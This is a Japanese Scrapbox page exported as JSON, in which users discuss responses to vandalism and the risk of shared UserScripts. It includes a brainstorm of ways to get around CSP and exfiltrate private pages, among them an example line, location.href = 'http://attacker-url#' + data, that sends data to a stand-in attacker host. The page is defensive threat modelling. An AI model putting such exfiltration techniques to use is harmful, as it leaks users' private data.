{
  "id": "5fbf179db9bfc7001feb9e08",
  "title": "Scrapboxで荒らしに対処する方法",
  "created": 1606358945,
  "updated": 1642766540,
  "lines": [
    {
      "id": "5fbf179db9bfc7001feb9e08",
      "text": "Scrapboxで荒らしに対処する方法",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606358945,
      "updated": 1606358945
    },
    {
      "id": "5fbf17a11280f000006a88ac",
      "text": "Scrapboxで[巧妙な荒らし]が発生したらどうするか",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606358945,
      "updated": 1606358957
    },
    {
      "id": "5fbf17a21280f000006a88ad",
      "text": "",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606358946,
      "updated": 1606358946
    },
    {
      "id": "5fbf17d41280f00000850875",
      "text": "2020-11-26 現時点で行える方法",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606358996,
      "updated": 1606359013
    },
    {
      "id": "5fbf17ff1280f0000085087b",
      "text": "\t荒らされたページをback upから復元する",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359040,
      "updated": 1606359053
    },
    {
      "id": "5fbf17e61280f00000850879",
      "text": "  1. jsonから該当するページのみを抽出する",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359015,
      "updated": 1606359127
    },
    {
      "id": "5fbf181e1280f0000085087c",
      "text": "  \t簡単に抽出できるtoolを作ったほうがよさそう",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359070,
      "updated": 1606359086
    },
    {
      "id": "5fbf182d1280f0000085087d",
      "text": "  2. import用jsonに変換",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359086,
      "updated": 1606359129
    },
    {
      "id": "5fbf18421280f0000085087e",
      "text": "  3. 上書きimport",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359106,
      "updated": 1606359133
    },
    {
      "id": "5fbf185d1280f0000085087f",
      "text": "  \t`overwritten`にチェックを入れる",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359133,
      "updated": 1606359143
    },
    {
      "id": "5fbf18e91280f00000850890",
      "text": " \t復元後にまた荒らしが荒らしてきたら意味がない",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359274,
      "updated": 1606359300
    },
    {
      "id": "5fbf186e1280f00000850886",
      "text": "\t該当accountを削除する",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359150,
      "updated": 1606359150
    },
    {
      "id": "5fbf18be1280f0000085088e",
      "text": "\t 特定個人による荒らしを止めることができる",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359230,
      "updated": 1606359273
    },
    {
      "id": "5fbf19051280f00000850891",
      "text": "\t accountを特定する必要がある",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359302,
      "updated": 1606359321
    },
    {
      "id": "5fbf18701280f0000085088d",
      "text": "\t[招待リンク]をresetする",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359152,
      "updated": 1606359152
    },
    {
      "id": "5fbf18661280f00000850880",
      "text": "  荒らしが再度参加するのを防ぐ",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359143,
      "updated": 1606359323
    },
    {
      "id": "5fbf191b1280f00000850892",
      "text": "  reset後のリンクを公開したら、また荒らしが入ってくる可能性がある",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359323,
      "updated": 1606359342
    },
    {
      "id": "5fc192a04daa920000f8b59e",
      "text": "",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521504,
      "updated": 1606521504
    },
    {
      "id": "5fc192a04daa920000f8b59f",
      "text": "まず荒らしに気付かないといけない",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521504,
      "updated": 1606521516
    },
    {
      "id": "5fc192ab4daa920000f8b5a0",
      "text": " 巧妙な荒らしの場合はこれがかなり困難だと思う",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521516,
      "updated": 1606521528
    },
    {
      "id": "5fc192b84daa920000f8b5a1",
      "text": " 小さな改変をされたら違和感を感じたしてhistoryからユーザー名を見ることでしか判別できない",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521528,
      "updated": 1606521594
    },
    {
      "id": "5fc192f94daa920000f8b5a2",
      "text": "  そもそもhistoryに編集したユーザーがでないこともある",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521594,
      "updated": 1606521610
    },
    {
      "id": "5fc1ad1e1280f00000897132",
      "text": "  commit logをたどれば行けそう？",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606528287,
      "updated": 1606528294
    },
    {
      "id": "5fc1930b4daa920000f8b5a4",
      "text": " ページが削除された場合は気付けるか？",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521611,
      "updated": 1606521621
    },
    {
      "id": "5fbf17d81280f00000850876",
      "text": "",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606359001,
      "updated": 1606359001
    },
    {
      "id": "5fbf2094dd59fe0000ebc901",
      "text": "荒らしについて考え始めると公開プロジェクトに置いてあるUserScriptも危険かもしれない",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606361236,
      "updated": 1606361350
    },
    {
      "id": "5fbf20a2dd59fe0000ebc903",
      "text": "　いつの間にか「プライベートプロジェクトの全ページをダンプしてどっかに送信する」スクリプトに書き換えられるとか",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606361250,
      "updated": 1606362135
    },
    {
      "id": "5fbf2095dd59fe0000ebc902",
      "text": " scrapbox.io以外のdomainにはfetchできないのでそこまでまずくはないと思います",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606361238,
      "updated": 1606367473
    },
    {
      "id": "5fbf38e51280f00000bf424f",
      "text": " \tただ以下の方法なら外部サイトに送信できる",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367473,
      "updated": 1606367490
    },
    {
      "id": "5fbf38f61280f00000bf4250",
      "text": " \t　cdnjsで外部に送信できるlibraryを探す",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367490,
      "updated": 1606367515
    },
    {
      "id": "5fbf390b1280f00000bf4251",
      "text": " \t　\tてかcdnjs経由でも外部に送信できるのかな",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367511,
      "updated": 1606367528
    },
    {
      "id": "5fbf391c1280f00000bf4252",
      "text": " \t　storage.googleapis.comにscriptを置く",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367528,
      "updated": 1606367606
    },
    {
      "id": "5fbf396a1280f00000bf4253",
      "text": " \t　　これが一番危険か",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367606,
      "updated": 1606367612
    },
    {
      "id": "5fbf397f1280f00000bf4254",
      "text": " \t　tempermonkeyに外部へ送信するscriptを置く",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367627,
      "updated": 1606367650
    },
    {
      "id": "5fbf39971280f00000bf4255",
      "text": " \t　　これで攻撃するのはちょっと無理がある",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367650,
      "updated": 1606367675
    },
    {
      "id": "5fbf39b01280f00000bf4256",
      "text": "  \t　　攻撃対象にscriptを自らinstallして貰う必要がある",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367675,
      "updated": 1606367697
    },
    {
      "id": "5fbf38a21280f00000bf424e",
      "text": "  バレても良いならそれこそ`location.href = \"http://attacker-url#\" + data`みたいな力技で送れそう",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606367406,
      "updated": 1606368333
    },
    {
      "id": "5fbf6958dd59fe00001b1272",
      "text": "  \t>Chrome limits URLs to a maximum length of 2MB [https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md Guidelines for URL Display]",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606379868,
      "updated": 1606379939
    },
    {
      "id": "5fbf695bdd59fe00001b1273",
      "text": "  \t約2MBまではこの方法で別ドメインのスクリプトに情報を渡せるのかな",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606379871,
      "updated": 1606380014
    },
    {
      "id": "5fbf3bebdd59fe0000de4d4f",
      "text": "  [CSP]があっても、やろうと思えば[邪悪]になれるんだなあ",
      "userId": "5f3cf18043ed94001edd59fe",
      "created": 1606368236,
      "updated": 1606376465
    },
    {
      "id": "5fbf5b9b1280f00000593f70",
      "text": "   まだどのブラウザにもサポートされてないみたいだけど仕様としてはあるみたい",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606376347,
      "updated": 1606521329
    },
    {
      "id": "5fc191f14daa920000f8b59a",
      "text": "    [CSP: navigate-to - HTTP | MDN https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/navigate-to]",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521329,
      "updated": 1606521329
    },
    {
      "id": "5fc191dd4daa920000f8b599",
      "text": "    ただ正規のaタグとは別に邪悪なaタグを挿入(または改変)されたのを識別できなさそうなので更に工夫が必要そう",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521310,
      "updated": 1606521471
    },
    {
      "id": "5fc1927f4daa920000f8b59d",
      "text": "     確か特定の文字列だけをDOMに挿入できるようにする機構があったはず",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521471,
      "updated": 1606521492
    },
    {
      "id": "5fc191f54daa920000f8b59b",
      "text": "    そもそもCSPもUserScriptの想定されてなさそう",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521333,
      "updated": 1606521466
    },
    {
      "id": "5ff319fc1280f000002b30b8",
      "text": " [UserScriptからprojectを削除できることがわかってしまった]ので、公開projectにおいてあるUserScriptを使うのは結構危険",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1609767420,
      "updated": 1609767457
    },
    {
      "id": "5ff31a201280f000002b30b9",
      "text": " 　コピペするだけで、それを読み込んだUserのprojectを一瞬で闇に葬りされる",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1609767457,
      "updated": 1609767496
    },
    {
      "id": "5fc192614daa920000f8b59c",
      "text": " 防衛策としてはこんなとこか",
      "userId": "5bc5772df30ff700134daa92",
      "created": 1606521442,
      "updated": 1606528430
    },
    {
      "id": "5fc1ad521280f00000897134",
      "text": "  安易に[UserScriptを他人のprojectから読み込むな]",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606528338,
      "updated": 1609767530
    },
    {
      "id": "5fc1adc81280f00000897139",
      "text": " この防衛策だけでも十分効果あるな",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606528457,
      "updated": 1606528474
    },
    {
      "id": "5fc1ad461280f00000897133",
      "text": "",
      "userId": "5ef2bdebb60650001e1280f0",
      "created": 1606528326,
      "updated": 1606528326
    }
  ]
}